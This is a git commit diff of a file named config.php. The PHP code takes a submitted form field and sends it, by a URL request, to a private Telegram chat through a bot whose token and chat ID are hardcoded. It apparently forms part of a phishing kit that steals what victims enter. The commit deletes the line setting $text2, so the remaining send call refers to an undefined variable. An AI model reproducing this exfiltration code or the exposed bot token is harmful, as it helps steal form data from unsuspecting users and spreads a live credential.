7442447b7c7f62736b4816d2695d994aae88c39f
AI22AK47 <94799989+AI22AK47@users.noreply.github.com>
2022-11-07 07:32:35 +0600

    Update config.php

--- config.php
+++ config.php
@@ -3,6 +3,5 @@
 $Ip = 'chat_id';
     if(isset($_POST['submit']))
     $text=$_POST["$Ip"];
-    $text2=$Ip;
         $response = file_get_contents("https://api.telegram.org/bot5710412371:AAGXuAdUqd5sP4dp-nGYbZhHy84MShP1p20/sendMessage?chat_id=5148207901&text=$text,$text2");    
 ?>
